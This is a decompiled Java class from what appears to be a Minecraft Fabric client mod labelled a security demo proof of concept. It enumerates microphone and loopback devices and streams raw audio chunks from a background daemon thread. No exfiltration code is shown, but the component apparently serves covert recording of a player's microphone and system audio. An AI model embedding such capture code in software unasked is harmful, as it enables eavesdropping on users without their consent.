package com.securitydemo.poc;

import java.nio.file.Path;
import java.util.ArrayList;
import java.util.Arrays;
import java.util.LinkedHashSet;
import java.util.List;
import java.util.Locale;
import java.util.Set;
import java.util.function.Consumer;
import javax.sound.sampled.AudioFormat;
import javax.sound.sampled.AudioSystem;
import javax.sound.sampled.DataLine;
import javax.sound.sampled.Line;
import javax.sound.sampled.LineUnavailableException;
import javax.sound.sampled.Mixer;
import javax.sound.sampled.TargetDataLine;
import net.fabricmc.api.EnvType;
import net.fabricmc.api.Environment;

@Environment(EnvType.CLIENT)
final class AudioCapture implements AutoCloseable {
   private static final PocLogger.Log LOGGER = PocLogger.get();
   private volatile Thread thread;
   private volatile TargetDataLine line;
   private volatile FfmpegAudioCapture ffmpegCapture;
   private volatile AudioFormat format;
   private volatile boolean running;
   private volatile String activeDeviceName;
   private volatile boolean ffmpegBackend;

   AudioFormat format() {
      return this.format;
   }

   String activeDeviceName() {
      return this.activeDeviceName;
   }

   static List<AudioDevice> listDevices(Source source) {
      Set<String> names = new LinkedHashSet();
      if (source == AudioCapture.Source.SYSTEM) {
         names.addAll(WindowsAudioDevices.listRenderDevices());
         names.addAll(FfmpegCapture.listDirectShowAudioDevices());

         for(Mixer.Info info : findSystemMixers()) {
            names.add(info.getName());
         }

         names.add("Stereo Mix");
         names.add("CABLE Output (VB-Audio Virtual Cable)");
      } else {
         names.addAll(FfmpegCapture.listDirectShowAudioDevices());

         for(Mixer.Info info : findMicMixers()) {
            names.add(info.getName());
         }
      }

      List<AudioDevice> devices = new ArrayList();
      int index = 0;

      for(String name : names) {
         if (name != null && !Compat.isBlank(name)) {
            devices.add(new AudioDevice(index++, name, name));
         }
      }

      return devices;
   }

   void start(Source source, int sampleRate, int channels, String deviceName, Consumer<byte[]> onChunk) throws LineUnavailableException {
      this.stop();
      Path ffmpeg = FfmpegCapture.findExecutable();
      if (ffmpeg != null && matchesDshowAudioDevice(deviceName)) {
         try {
            this.startFfmpeg(ffmpeg, deviceName, sampleRate, channels, onChunk);
            return;
         } catch (LineUnavailableException e) {
            LOGGER.warn("ffmpeg audio failed for {}: {}", deviceName, e.getMessage());
            if (source == AudioCapture.Source.MIC) {
               throw e;
            }
         }
      }

      LineOpenResult opened = openLine(source, sampleRate, channels, deviceName);
      opened.line.start();
      this.line = opened.line;
      this.format = opened.format;
      this.activeDeviceName = opened.deviceName;
      this.ffmpegBackend = false;
      this.running = true;
      Runnable var10003 = () -> this.pump(opened.line, onChunk);
      String var10004 = source.name();
      this.thread = new Thread(var10003, "security-demo-poc-audio-" + var10004.toLowerCase(Locale.ROOT));
      this.thread.setDaemon(true);
      this.thread.start();
      LOGGER.info("Audio capture started: {} {}Hz {}ch (device: {})", source, (int)this.format.getSampleRate(), this.format.getChannels(), opened.deviceName);
   }

   private static boolean matchesDshowAudioDevice(String deviceName) {
      if (deviceName != null && !Compat.isBlank(deviceName)) {
         String resolved = FfmpegCapture.resolveDshowAudioDeviceName(deviceName);

         for(String listed : FfmpegCapture.listDirectShowAudioDevices()) {
            if (listed.equalsIgnoreCase(resolved)) {
               return true;
            }
         }

         String norm = deviceName.trim().toLowerCase(Locale.ROOT);

         for(String listed : FfmpegCapture.listDirectShowAudioDevices()) {
            String listedNorm = listed.toLowerCase(Locale.ROOT);
            if (listedNorm.contains(norm) || norm.contains(listedNorm)) {
               return true;
            }
         }

         return false;
      } else {
         return !FfmpegCapture.listDirectShowAudioDevices().isEmpty();
      }
   }

   private void startFfmpeg(Path ffmpeg, String deviceName, int sampleRate, int channels, Consumer<byte[]> onChunk) throws LineUnavailableException {
      try {
         this.ffmpegCapture = new FfmpegAudioCapture();
         this.ffmpegCapture.start(ffmpeg, deviceName, sampleRate, channels, onChunk);
         this.ffmpegBackend = true;
         this.activeDeviceName = FfmpegCapture.resolveDshowAudioDeviceName(deviceName);
         this.format = new AudioFormat((float)this.ffmpegCapture.sampleRate(), 16, this.ffmpegCapture.channels(), true, false);
         this.running = true;
         LOGGER.info("Audio capture started via ffmpeg: {} {}Hz {}ch", this.activeDeviceName, (int)this.format.getSampleRate(), this.format.getChannels());
      } catch (Exception e) {
         if (this.ffmpegCapture != null) {
            this.ffmpegCapture.stop();
            this.ffmpegCapture = null;
         }

         throw new LineUnavailableException(e.getMessage());
      }
   }

   private void pump(TargetDataLine activeLine, Consumer<byte[]> onChunk) {
      byte[] buffer = new byte[8192];

      while(this.running) {
         int read = activeLine.read(buffer, 0, buffer.length);
         if (read > 0) {
            byte[] chunk = new byte[read];
            System.arraycopy(buffer, 0, chunk, 0, read);
            onChunk.accept(chunk);
         }
      }

   }

   private static LineOpenResult openLine(Source source, int sampleRate, int channels, String deviceName) throws LineUnavailableException {
      List<int[]> rateChannelPairs = Arrays.asList(new int[]{sampleRate, channels}, new int[]{44100, 2}, new int[]{44100, 1}, new int[]{48000, 2}, new int[]{48000, 1}, new int[]{22050, 1}, new int[]{16000, 1});
      List<Mixer.Info> allCandidates = source == AudioCapture.Source.MIC ? findMicMixers() : findSystemMixers();
      List<Mixer.Info> candidates = pickCandidates(allCandidates, deviceName);
      if (candidates.isEmpty()) {
         throw new LineUnavailableException(source == AudioCapture.Source.MIC ? "No microphone device found" : "System audio device not found. Enable Stereo Mix or route audio through VB-Cable.");
      } else {
         LineUnavailableException lastError = null;

         for(Mixer.Info mixerInfo : candidates) {
            for(int[] pair : rateChannelPairs) {
               AudioFormat format = new AudioFormat((float)pair[0], 16, pair[1], true, false);

               try {
                  TargetDataLine opened = openOnMixer(mixerInfo, format);
                  return new LineOpenResult(opened, format, mixerInfo.getName());
               } catch (LineUnavailableException e) {
                  lastError = e;
               }
            }
         }

         throw lastError != null ? lastError : new LineUnavailableException("Unable to open audio line");
      }
   }

   private static List<Mixer.Info> pickCandidates(List<Mixer.Info> allCandidates, String deviceName) {
      if (deviceName != null && !Compat.isBlank(deviceName)) {
         String wanted = deviceName.trim().toLowerCase(Locale.ROOT);
         List<Mixer.Info> exact = new ArrayList();
         List<Mixer.Info> partial = new ArrayList();

         for(Mixer.Info info : allCandidates) {
            String name = info.getName().toLowerCase(Locale.ROOT);
            String description = info.getDescription() != null ? info.getDescription().toLowerCase(Locale.ROOT) : "";
            if (!name.equals(wanted) && !description.equals(wanted)) {
               if (name.contains(wanted) || wanted.contains(name) || description.contains(wanted) || wanted.contains(description)) {
                  partial.add(info);
               }
            } else {
               exact.add(info);
            }
         }

         if (!exact.isEmpty()) {
            return exact;
         } else if (!partial.isEmpty()) {
            return partial;
         } else {
            return allCandidates;
         }
      } else {
         return allCandidates;
      }
   }

   private static List<Mixer.Info> findMicMixers() {
      Set<Mixer.Info> result = new LinkedHashSet();

      for(Mixer.Info info : AudioSystem.getMixerInfo()) {
         String name = info.getName().toLowerCase(Locale.ROOT);
         if (!name.contains("stereo mix") && !name.contains("what u hear") && !name.contains("loopback") && !isLikelyOutputOnly(name)) {
            try {
               Mixer mixer = AudioSystem.getMixer(info);
               if (hasTargetDataLine(mixer)) {
                  result.add(info);
               }
            } catch (Exception var7) {
            }
         }
      }

      return new ArrayList(result);
   }

   private static List<Mixer.Info> findSystemMixers() {
      Set<Mixer.Info> result = new LinkedHashSet();
      String[] hints = new String[]{"stereo mix", "what u hear", "loopback", "wave out mix", "waveout", "mix", "cable output", "cable in", "virtual-audio", "monitor", "wasapi"};

      for(Mixer.Info mixerInfo : AudioSystem.getMixerInfo()) {
         String name = mixerInfo.getName().toLowerCase(Locale.ROOT);
         String description = mixerInfo.getDescription() != null ? mixerInfo.getDescription().toLowerCase(Locale.ROOT) : "";
         String combined = name + " " + description;
         if (!isObviousMic(combined)) {
            boolean matched = false;

            for(String hint : hints) {
               if (combined.contains(hint)) {
                  matched = true;
                  break;
               }
            }

            if (matched || isLikelyOutputCapture(name, description)) {
               try {
                  if (hasTargetDataLine(AudioSystem.getMixer(mixerInfo))) {
                     result.add(mixerInfo);
                  }
               } catch (Exception var14) {
               }
            }
         }
      }

      return new ArrayList(result);
   }

   private static boolean isObviousMic(String combined) {
      return combined.contains("microphone") || combined.contains("микрофон") || combined.contains("mic (") || combined.contains(" mic ") || combined.contains("headset mic") || combined.contains("life cam");
   }

   private static boolean isLikelyOutputOnly(String name) {
      return name.contains("speakers") || name.contains("speaker") || name.contains("output") || name.contains("hdmi") || name.contains("nvidia") || name.contains("realtek hd audio output");
   }

   private static boolean isLikelyOutputCapture(String name, String description) {
      String combined = (name + " " + description).toLowerCase(Locale.ROOT);
      return combined.contains("speaker") || combined.contains("headphone") || combined.contains("headset") || combined.contains("output") || combined.contains("hdmi") || combined.contains("nvidia") || combined.contains("realtek") || combined.contains("display") || combined.contains("monitor") || combined.contains("cable") || combined.contains("aux") || combined.contains("динамик") || combined.contains("наушник");
   }

   private static boolean hasTargetDataLine(Mixer mixer) {
      for(Line.Info lineInfo : mixer.getTargetLineInfo()) {
         if (lineInfo instanceof DataLine.Info) {
            return true;
         }
      }

      return false;
   }

   private static TargetDataLine openOnMixer(Mixer.Info mixerInfo, AudioFormat format) throws LineUnavailableException {
      Mixer mixer = AudioSystem.getMixer(mixerInfo);
      DataLine.Info wanted = new DataLine.Info(TargetDataLine.class, format);
      if (mixer.isLineSupported(wanted)) {
         TargetDataLine opened = (TargetDataLine)mixer.getLine(wanted);
         opened.open(format);
         return opened;
      } else {
         for(Line.Info lineInfo : mixer.getTargetLineInfo()) {
            if (lineInfo instanceof DataLine.Info) {
               DataLine.Info dataInfo = (DataLine.Info)lineInfo;
               if (dataInfo.isFormatSupported(format)) {
                  TargetDataLine opened = (TargetDataLine)mixer.getLine(lineInfo);
                  opened.open(format);
                  return opened;
               }
            }
         }

         throw new LineUnavailableException("Format not supported on " + mixerInfo.getName());
      }
   }

   void stop() {
      this.running = false;
      if (this.thread != null) {
         this.thread.interrupt();
         this.thread = null;
      }

      TargetDataLine active = this.line;
      this.line = null;
      this.format = null;
      this.activeDeviceName = null;
      this.ffmpegBackend = false;
      if (active != null) {
         active.stop();
         active.close();
      }

      if (this.ffmpegCapture != null) {
         this.ffmpegCapture.stop();
         this.ffmpegCapture = null;
      }

   }

   public void close() {
      this.stop();
   }

   @Environment(EnvType.CLIENT)
   static enum Source {
      MIC,
      SYSTEM;

      // $FF: synthetic method
      private static Source[] $values() {
         return new Source[]{MIC, SYSTEM};
      }
   }

   @Environment(EnvType.CLIENT)
   static final class AudioDevice {
      final int index;
      final String name;
      final String description;

      AudioDevice(int index, String name, String description) {
         this.index = index;
         this.name = name;
         this.description = description;
      }
   }

   @Environment(EnvType.CLIENT)
   private static final class LineOpenResult {
      final TargetDataLine line;
      final AudioFormat format;
      final String deviceName;

      LineOpenResult(TargetDataLine line, AudioFormat format, String deviceName) {
         this.line = line;
         this.format = format;
         this.deviceName = deviceName;
      }
   }
}
